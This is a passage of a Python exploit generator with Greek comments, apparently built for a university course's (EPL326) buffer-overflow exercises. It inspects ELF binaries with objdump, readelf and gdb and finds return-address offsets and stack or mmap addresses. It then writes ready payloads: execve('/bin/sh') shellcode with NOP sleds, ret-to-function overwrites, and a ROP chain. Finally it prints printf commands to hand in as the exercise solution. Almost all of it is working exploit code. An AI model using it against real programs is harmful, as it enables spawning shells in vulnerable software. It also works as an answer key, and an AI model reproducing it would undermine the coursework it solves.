            code += set_rax_no_null(nr64)
            code += b"\x0f\x05"
            code += sc_exit_64()
            return code

    raise ValueError(f"Unsupported syscall: {syscall} (not in SYSCALLS table or no NR for {bits}-bit)")

def check_nulls(sc_bytes):
    return b'\x00' in sc_bytes

def to_c_string(sc_bytes):
    return ''.join(f'\\x{b:02x}' for b in sc_bytes)

def to_python_bytes(sc_bytes):
    return 'b"' + ''.join(f'\\x{b:02x}' for b in sc_bytes) + '"'

# ============================================================
# EXPLOIT BUILDER
# ============================================================
def build_exploit(shellcode, offset, stack_addr, bits=32):
    nop_count = offset - len(shellcode)
    if nop_count < 0:
        raise ValueError(f"Shellcode ({len(shellcode)}B) > offset ({offset})")
    payload = b"\x90" * nop_count + shellcode
    if bits == 32:
        payload += struct.pack("<I", stack_addr)
    else:
        payload += struct.pack("<Q", stack_addr)
    return payload


# ─── Shellcode ────────────────────────────────────────────────────────────────

SHELLCODE_32 = (
    b"\x31\xc0"
    b"\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3"
    b"\x31\xc9"
    b"\x31\xd2"
    b"\xb0\x0b"
    b"\xcd\x80"
)

SHELLCODE_64 = (
    b"\x48\x31\xc0"
    b"\x50"
    b"\x49\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    b"\x41\x51"
    b"\x48\x89\xe7"
    b"\x48\x31\xf6"
    b"\x48\x31\xd2"
    b"\xb0\x3b"
    b"\x0f\x05"
)

def p32(v): return struct.pack("<I", v & 0xFFFFFFFF)

def run(cmd):
    try: return subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(errors="ignore")
    except: return ""

def banner(msg): print(f"\n{'─'*60}\n  {msg}\n{'─'*60}")

def gdb_batch(binary, commands, input_file=None, timeout=20):
    """
    Τρέχει GDB με stdin ώστε να φορτώνει το .gdbinit αυτόματα.
    Το .gdbinit έχει: unset environment, set env TEMP=1000, set exec-wrapper setarch i686 -R -3
    Αυτό εξασφαλίζει σωστό περιβάλλον για 32-bit binaries.
    """
    binary = os.path.abspath(binary)

    # Χτίζουμε το GDB script ως stdin
    # Σειρά: setup → breakpoints → r file → inspect → quit
    setup = ["set pagination off", "set debuginfod enabled off"]
    # Χώρισε commands σε breakpoints (b *) και inspections (x/, i r)
    bps = [c for c in commands if c.startswith("b ")]
    inspections = [c for c in commands if not c.startswith("b ")]
    gdb_cmds = setup + bps
    if input_file:
        gdb_cmds.append(f"r {input_file}")
    gdb_cmds += inspections
    gdb_cmds.append("quit")

    gdb_input = "\n".join(gdb_cmds) + "\n"

    try:
        result = subprocess.run(
            ["gdb", binary],
            input=gdb_input,
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"[GDB ERROR] {e}"


# ─── Analysis ─────────────────────────────────────────────────────────────────

def analyze(binary):
    info = {
        "path": binary, "arch": 32,
        "offset_to_ret": None, "stack_exec": False,
        "has_mmap": False, "has_drm": False, "drm_addr": None,
        "data_addr": None, "gadget_layout": None, "gadget_bytes": {},
        "has_offset_fn": False, "offset_sub": 100, "offset_cmp": 1000,
        "temp_offset": 0, "attack_type": None,
        "memcpy_bp": None,  # breakpoint αμέσως μετά το call memcpy
    }

    disasm  = run(["objdump", "-d", binary])
    nm_out  = run(["nm", binary])
    strings = run(["strings", binary])
    elf_seg = run(["readelf", "-l", binary])
    elf_sec = run(["readelf", "-S", binary])

    if "ELF 64" in run(["file", binary]): info["arch"] = 64

    for line in elf_seg.splitlines():
        if "GNU_STACK" in line and "RWE" in line:
            info["stack_exec"] = True

    info["has_mmap"] = "mmap" in strings

    funcs = {}
    for line in nm_out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[1] in ("T", "t"):
            funcs[parts[2]] = int(parts[0], 16)
    if "display_root_menu" in funcs:
        info["has_drm"] = True
        info["drm_addr"] = funcs["display_root_menu"]

    for line in elf_sec.splitlines():
        if re.search(r'\s\.data\s', line) and "PROGBITS" in line:
            parts = line.split()
            for i, p in enumerate(parts):
                if p == ".data" and i+2 < len(parts):
                    try: info["data_addr"] = int(parts[i+2], 16) + 8
                    except: pass

    # Offset από lea + memcpy στο display_file + breakpoint addr
    in_disp = False; last_lea = None; last_addr = 0
    for line in disasm.splitlines():
        if "<display_file>:" in line: in_disp = True; continue
        if in_disp and re.match(r"[0-9a-f]+ <[^>]+>:", line) and "display_file" not in line:
            in_disp = False
        if not in_disp: continue
        m = re.match(r"\s*([0-9a-f]+):\s", line)
        if m: last_addr = int(m.group(1), 16)
        m2 = re.search(r"lea\s+(-0x[0-9a-f]+)\(%ebp\),%eax", line)
        if m2: last_lea = abs(int(m2.group(1), 16))
        if "<memcpy" in line and last_lea:
            info["offset_to_ret"] = last_lea + 4
            info["memcpy_bp"] = f"*0x{last_addr + 5:x}"
            break

    if info["has_mmap"]:
        gb = {}; in_main = False; cur = 0
        for line in disasm.splitlines():
            if "<main>:" in line: in_main = True; continue
            if in_main and re.match(r"[0-9a-f]+ <[^>]+>:", line) and "main" not in line:
                in_main = False
            if not in_main: continue
            s = line.strip()
            m = re.search(r"add\s+\$0x([0-9a-f]+),%eax", s)
            if m: cur = int(m.group(1), 16); continue
            m2 = re.search(r"movb\s+\$0x([0-9a-f]+),\(%eax\)", s)
            if m2: gb[cur] = int(m2.group(1), 16); cur = 0
        info["gadget_bytes"] = gb
        info["gadget_layout"] = "A" if gb.get(0) == 0x58 else ("B" if gb.get(0) == 0x31 else None)

    if "offset" in funcs:
        info["has_offset_fn"] = True
        in_off = False
        for line in disasm.splitlines():
            if "<offset>:" in line: in_off = True; continue
            if in_off and re.match(r"[0-9a-f]+ <[^>]+>:", line) and "offset" not in line:
                in_off = False
            if not in_off: continue
            s = line.strip()
            m = re.search(r"subl?\s+\\\$0x([0-9a-f]+)", s)
            if m: info["offset_sub"] = int(m.group(1), 16)
            m2 = re.search(r"cmpl?\s+\\\$0x([0-9a-f]+)", s)
            if m2: info["offset_cmp"] = int(m2.group(1), 16)
        val = 1000
        while val > info["offset_cmp"]: val -= info["offset_sub"]
        info["temp_offset"] = val

    if info["stack_exec"]:   info["attack_type"] = "shellcode"
    elif info["has_mmap"]:   info["attack_type"] = "rop_mmap"
    elif info["has_drm"]:    info["attack_type"] = "ret2func"
    else:                    info["attack_type"] = "shellcode"

    return info


# ─── Auto Stack Detection (shellcode) ─────────────────────────────────────────

def auto_find_shellcode_addr(binary, info):
    sc = sc_execve_32() if info["arch"] == 32 else sc_execve_64()
    nops = max(0, info["offset_to_ret"] - len(sc))
    probe = sc + b"\x90" * nops + b"\xef\xbe\xad\xde"

    tmp = tempfile.mktemp(suffix="_probe")
    with open(tmp, "wb") as f:
        f.write(f"{len(probe)}\n".encode())
        f.write(probe)

    output = gdb_batch(binary, [
        f"b {info['memcpy_bp']}",
        "x/80wx $esp-80",
        "i r esp",
    ], input_file=tmp)
    os.unlink(tmp)

    # ESP — ψάχνουμε με flexible regex
    esp = None
    for m in re.finditer(r"esp\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)", output):
        esp = int(m.group(1), 16); break
    if esp is None:
        for m in re.finditer(r"esp\s+(0x[0-9a-f]+)", output):
            esp = int(m.group(1), 16); break
    if esp is None:
        print("[!] ΑΠΟΤΥΧΙΑ: GDB δεν επέστρεψε ESP")
        print("    → Έλεγξε ότι υπάρχει το ~/.gdbinit με σωστό περιεχόμενο")
        print("    → Δοκίμασε: python3 solver.py bin.X --stack-addr 0xXXXXXXXX")
        print(f"    → GDB output: {output[:200]}")
        return None
    print(f"[*] ESP (μετά memcpy): 0x{esp:08x}")

    # Ψάξε shellcode bytes στο dump
    sc_hex = f"{struct.unpack('<I', sc[:4])[0]:08x}"
    shellcode_addr = None
    for line in output.splitlines():
        m = re.match(r"(0x[0-9a-f]+):\s+(.*)", line)
        if not m: continue
        base = int(m.group(1), 16)
        for i, val in enumerate(re.findall(r"0x([0-9a-f]+)", m.group(2))):
            if val == sc_hex:
                shellcode_addr = base + i * 4
                break
        if shellcode_addr: break

    if shellcode_addr:
        print(f"[*] Shellcode @ 0x{shellcode_addr:08x}")
        return shellcode_addr
    else:
        print("[!] ΑΠΟΤΥΧΙΑ: Shellcode δεν βρέθηκε στο memory dump")
        print("    → Πιθανώς το breakpoint δεν χτυπήθηκε")
        print(f"    → memcpy_bp: {info['memcpy_bp']}")
        print("    → Δοκίμασε: python3 solver.py bin.X --stack-addr 0xXXXXXXXX")
        print("    → Βρες τη διεύθυνση με GDB: b display_file → r → finish → i r esp")
        return None


# ─── Auto mmap Detection (ROP) ────────────────────────────────────────────────

def auto_find_mmap(binary, info):
    """
    Τρέχει GDB, σταματά στο display_file, τρέχει info proc mappings,
    βρίσκει το rwx region = mmap_result.
    """
    tmp = tempfile.mktemp(suffix="_probe")
    # Dummy input — αρκεί να μπει στο display_file
    with open(tmp, "wb") as f:
        f.write(b"8\nAAAAAAAA")

    output = gdb_batch(binary, [
        "b display_file",
        "info proc mappings",
    ], input_file=tmp)
    os.unlink(tmp)

    # Ψάξε rwx region στο output
    # Format: 0xADDR  0xADDR  0xSIZE  0xOFF  rwxp  ...
    mmap_addr = None
    for line in output.splitlines():
        if "rwx" in line:
            m = re.search(r"(0x[0-9a-f]+)", line)
            if m:
                mmap_addr = int(m.group(1), 16)
                break

    if mmap_addr:
        print(f"[*] mmap rwx region @ 0x{mmap_addr:08x}")
        return mmap_addr
    else:
        print("[!] ΑΠΟΤΥΧΙΑ: rwx region δεν βρέθηκε")
        print("    → Δοκίμασε: python3 solver.py bin.X --mmap-result 0xXXXXXXXX")
        print("    → Βρες με GDB: b display_file → r → info proc mappings → βρες rwx region")
        return None


# ─── Auto Gadget Detection (ROP) ─────────────────────────────────────────────────

def auto_find_gadget_addr(binary, info, mmap_addr):
    """
    Τρέχει GDB, σταματά ΜΕΤΑ το memcpy της main (όπου τα gadgets έχουν αντιγραφεί),
    και βρίσκει την ακριβή διεύθυνση των gadgets από το return value του memcpy (eax).
    """
    tmp = tempfile.mktemp(suffix="_probe")
    with open(tmp, "wb") as f:
        f.write(b"8\nAAAAAAAA")

    # Βρες το call memcpy στη main από το disasm
    disasm = run(["objdump", "-d", binary])
    memcpy_ret = None
    in_main = False
    for line in disasm.splitlines():
        if "<main>:" in line: in_main = True; continue
        if in_main and re.match(r"[0-9a-f]+ <[^>]+>:", line) and "main" not in line:
            in_main = False
        if not in_main: continue
        if "<memcpy" in line or "<memcpy@plt" in line:
            m = re.match(r"\s*([0-9a-f]+):", line)
            if m:
                memcpy_ret = f"*0x{int(m.group(1),16)+5:x}"

    if not memcpy_ret:
        print("[!] Δεν βρέθηκε το memcpy στη main")
        return None

    print(f"[*] memcpy in main @ {memcpy_ret}")

    output = gdb_batch(binary, [
        f"b {memcpy_ret}",
        "i r eax",
    ], input_file=tmp)
    os.unlink(tmp)

    # Βρες το eax (return value = dst address = gadget base)
    gadget_addr = None
    for m in re.finditer(r"eax\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)", output):
        gadget_addr = int(m.group(1), 16)
        break
    if gadget_addr is None:
        for m in re.finditer(r"eax\s+(0x[0-9a-f]+)", output):
            gadget_addr = int(m.group(1), 16)
            break

    if gadget_addr:
        print(f"[*] Gadgets @ 0x{gadget_addr:08x} (από memcpy return value)")
        return gadget_addr
    else:
        print("[!] ΑΠΟΤΥΧΙΑ: Gadget address δεν βρέθηκε")
        print("    → Δοκίμασε: python3 solver.py bin.X --mmap-result 0xXXXXXXXX --no-temp-offset")
        return None


# ─── Exploit Builders ─────────────────────────────────────────────────────────

def write_file(payload, path):
    with open(path, "wb") as f:
        f.write(f"{len(payload)}\n".encode())
        f.write(payload)
    print(f"[+] Exploit file '{path}': {len(payload)} bytes")


def build_shellcode_payload(info, stack_addr, syscall='execve', sc_args=[]):
    sc   = build_shellcode(syscall, sc_args, bits=info["arch"])
    nops = max(0, info["offset_to_ret"] - len(sc))
    payload = sc + b"\x90" * nops + p32(stack_addr)
    has_nulls = check_nulls(sc)
    print(f"[+] Attack:    shellcode injection ({syscall})")
    print(f"[+] Shellcode: {len(sc)}B  NOPs: {nops}B  Total: {len(payload)}B" + (" ⚠ NULL BYTES" if has_nulls else " ✓ null-free"))
    print(f"[+] ret_addr:  0x{stack_addr:08x}")
    return payload


def build_ret2func(info):
    payload = b"\x41" * info["offset_to_ret"] + p32(info["drm_addr"])
    print(f"[+] Attack:    ret-to-function → display_root_menu @ 0x{info['drm_addr']:08x}")
    print(f"[+] Offset:    {info['offset_to_ret']}B  Payload: {len(payload)}B")
    return payload


def build_rop(info, mmap_result, no_temp_offset=False):
    offset   = info["offset_to_ret"]
    data     = info["data_addr"]
    layout   = info.get("gadget_layout", "A")
    temp_off = info.get("temp_offset", 0)
    # Auto-detect: αν heap address (malloc) ή --no-temp-offset → temp_offset=0
    if no_temp_offset or (0x08000000 <= mmap_result < 0x09000000):
        base = mmap_result
    else:
        base = mmap_result + temp_off

    if layout == "A":
        # Layout A: pop_eax/ebx first
        # +0: pop eax; pop ebx; ret
        # +3: xor eax,eax; ret
        # +6: mov eax,(ebx); ret
        # +9: mov eax,ebx; ret
        # +12: xor ecx,ecx; ret
        # +15: xor edx,edx; ret
        # +18: mov $0xb,%al; ret
        # +21: int $0x80; ret
        g_pop=base+0; g_xor_eax=base+3; g_mov=base+6
        g_movebx=base+9; g_xcx=base+12; g_xdx=base+15
        g_execve=base+18; g_int80=base+21
    else:
        # Layout B: xor eax first
        # +0: xor eax,eax; ret
        # +3: pop eax; pop ebx; ret
        # +6: mov eax,(ebx); ret
        # +9: xor ecx,ecx; ret
        # +12: mov eax,ebx; ret
        # +15: mov $0xb,%al; ret
        # +18: xor edx,edx; ret
        # +21: int $0x80; ret
        g_xor_eax=base+0; g_pop=base+3; g_mov=base+6
        g_xcx=base+9; g_movebx=base+12; g_execve=base+15
        g_xdx=base+18; g_int80=base+21

    rop  = b"\x41" * offset
    rop += p32(g_pop)     + p32(0x6e69622f) + p32(data)     + p32(g_mov)
    rop += p32(g_pop)     + p32(0x68732f2f) + p32(data + 4) + p32(g_mov)
    rop += p32(g_pop)     + p32(0x41414141) + p32(data + 8)
    rop += p32(g_xor_eax) + p32(g_mov)
    rop += p32(g_pop)     + p32(data)       + p32(data)
    rop += p32(g_movebx)  + p32(g_xor_eax) + p32(g_xcx) + p32(g_xdx) + p32(g_execve) + p32(g_int80)

    print(f"[+] Attack:    ROP chain (layout {layout})")
    print(f"[+] mmap_result: 0x{mmap_result:08x}  temp_offset: +{temp_off}")
    print(f"[+] gadget_base: 0x{base:08x}  .data: 0x{data:08x}")
    print(f"[+] Payload:   {len(rop)}B")
    return rop


def hexdump(data, limit=128):
    print("[*] Payload hex dump:")
    for i in range(0, min(len(data), limit), 16):
        c = data[i:i+16]
        print(f"  {i:04x}:  {' '.join(f'{b:02x}' for b in c):<47}  {''.join(chr(b) if 32<=b<127 else '.' for b in c)}")
    if len(data) > limit: print(f"  ... ({len(data)-limit} bytes ακόμα)")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="EPL326 — Exploit Solver v9 (+ Shellcode Gen)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Παραδείγματα:\n"
            "  python3 epl326_solver_v8.py ./bin.X                          # αυτόματο\n"
            "  python3 epl326_solver_v8.py ./bin.X --stack-addr 0xbfffe2e4  # manual\n"
            "  python3 epl326_solver_v8.py ./bin.X --mmap-result 0xf7700000 # manual\n"
        )
    )
    ap.add_argument("binary")
    ap.add_argument("-o", "--output",      default="file")
    ap.add_argument("--stack-addr",        type=lambda x: int(x,16), default=None)
    ap.add_argument("--mmap-result",       type=lambda x: int(x,16), default=None)
    ap.add_argument("--no-temp-offset",    action="store_true",
                    help="Μην προσθέσεις temp_offset (για heap gadgets)")
    ap.add_argument("--offset",            type=int, default=None)
    ap.add_argument("--force-shellcode",   action="store_true")
    ap.add_argument("--force-rop",         action="store_true")
    ap.add_argument("--force-ret2func",    action="store_true")
    ap.add_argument("--syscall",           default="execve",
                    help="Syscall για shellcode (default: execve). π.χ. unlink, read, write")
    ap.add_argument("--sc-args",           nargs="*", default=[],
                    help="Arguments για το syscall (π.χ. filename για unlink/read)")
    ap.add_argument("--list-syscalls",     action="store_true",
                    help="Λίστα όλων των διαθέσιμων syscalls")
    ap.add_argument("--printf",            action="store_true",
                    help="Εκτύπωσε την εντολή printf για παράδοση (σαν τον καθηγητή)")
    args = ap.parse_args()

    if args.list_syscalls:
        print(f"{'Syscall':<20} {'32-bit':>8} {'64-bit':>8}")
        print("-" * 40)
        for name, (nr32, nr64) in sorted(SYSCALLS.items()):
            n32 = f"0x{nr32:02x}" if nr32 is not None else "N/A"
            n64 = f"0x{nr64:02x}" if nr64 is not None else "N/A"
            print(f"  {name:<18} {n32:>8} {n64:>8}")
        return

    if not os.path.exists(args.binary):
        print(f"[!] Δεν βρέθηκε: {args.binary}"); sys.exit(1)

    banner(f"Ανάλυση: {args.binary}")
    info = analyze(args.binary)
    if args.offset: info["offset_to_ret"] = args.offset

    print(f"  arch:              {info['arch']}-bit")
    print(f"  stack executable:  {info['stack_exec']}")
    print(f"  mmap:              {info['has_mmap']}")
    print(f"  display_root_menu: {info['has_drm']}" +
          (f"  @ 0x{info['drm_addr']:08x}" if info['drm_addr'] else ""))
    print(f"  .data addr:        " + (f"0x{info['data_addr']:08x}" if info['data_addr'] else "N/A"))
    print(f"  offset_to_ret:     {info['offset_to_ret']} bytes")
    print(f"  memcpy_bp:         {info['memcpy_bp']}")
    if info["has_offset_fn"]:
        print(f"  offset(TEMP=1000): +{info['temp_offset']} bytes")
    print(f"  attack_type:       {info['attack_type']}")

    if info["offset_to_ret"] is None:
        print("\n[!] Offset δεν βρέθηκε. Χρησιμοποίησε --offset N")
        sys.exit(1)

    if args.force_shellcode:  info["attack_type"] = "shellcode"
    elif args.force_rop:      info["attack_type"] = "rop_mmap"
    elif args.force_ret2func: info["attack_type"] = "ret2func"

    # ─── Auto detection ──────────────────────────────────────────────────────
    if info["attack_type"] == "shellcode" and args.stack_addr is None:
        banner("Auto Stack Detection (GDB)")
        args.stack_addr = auto_find_shellcode_addr(args.binary, info)
        if args.stack_addr is None: sys.exit(1)

    if info["attack_type"] == "rop_mmap" and args.mmap_result is None:
        banner("Auto mmap Detection (GDB)")
        args.mmap_result = auto_find_mmap(args.binary, info)
        if args.mmap_result is None: sys.exit(1)
        # Auto-find gadget address (από memcpy return value)
        if not args.no_temp_offset:
            gadget_addr = auto_find_gadget_addr(args.binary, info, args.mmap_result)
            if gadget_addr:
                args.mmap_result = gadget_addr
                args.no_temp_offset = True

    # ─── Build & write exploit ───────────────────────────────────────────────
    banner(f"Exploit → '{args.output}'")

    if info["attack_type"] == "shellcode":
        payload = build_shellcode_payload(info, args.stack_addr, args.syscall, args.sc_args)
    elif info["attack_type"] == "ret2func":
        payload = build_ret2func(info)
    elif info["attack_type"] == "rop_mmap":
        payload = build_rop(info, args.mmap_result, getattr(args, "no_temp_offset", False))
    else:
        print(f"[!] Unknown: {info['attack_type']}"); sys.exit(1)

    write_file(payload, args.output)
    hexdump(payload)

    banner("Εκτέλεση")
    print(f"  (cat; echo exit) | ./run.sh ./{os.path.basename(args.binary)} {args.output}")
    print()
    print("  shell prompt → επιτυχία!")
    print("  crash        → δοκίμασε manual override")

    # ─── Παράδοση ────────────────────────────────────────────────────────────
    bin_name = os.path.basename(args.binary)
    banner("Παράδοση — αντιγράψτε και εκτελέστε")
    print(f"  # Αυτή είναι η λύση για το διαγνωστικό:")
    print()

    if info["attack_type"] == "shellcode":
        payload_hex = "".join(f"\\x{b:02x}" for b in payload)
        print(f'  printf "{len(payload)} {payload_hex}" > {args.output}')
        print(f"  ./run.sh ./{bin_name} {args.output}")

    elif info["attack_type"] == "ret2func":
        padding = "A" * info["offset_to_ret"]
        addr_hex = "".join(f"\\x{b:02x}" for b in payload[-4:])
        print(f'  printf "{len(payload)} {padding}{addr_hex}" > {args.output}')
        print(f"  ./run.sh ./{bin_name} {args.output}")

    elif info["attack_type"] == "rop_mmap":
        payload_hex = "".join(
            chr(b) if 32 <= b < 127 and b not in (34, 92, 37) else f"\\x{b:02x}"
            for b in payload
        )
        print(f'  printf "{len(payload)} {payload_hex}" > {args.output}')
        print(f"  ./run.sh ./{bin_name} {args.output}")

    print()
    print(f"  (cat; echo exit) | ./run.sh ./{bin_name} {args.output}")


if __name__ == "__main__":
    main()
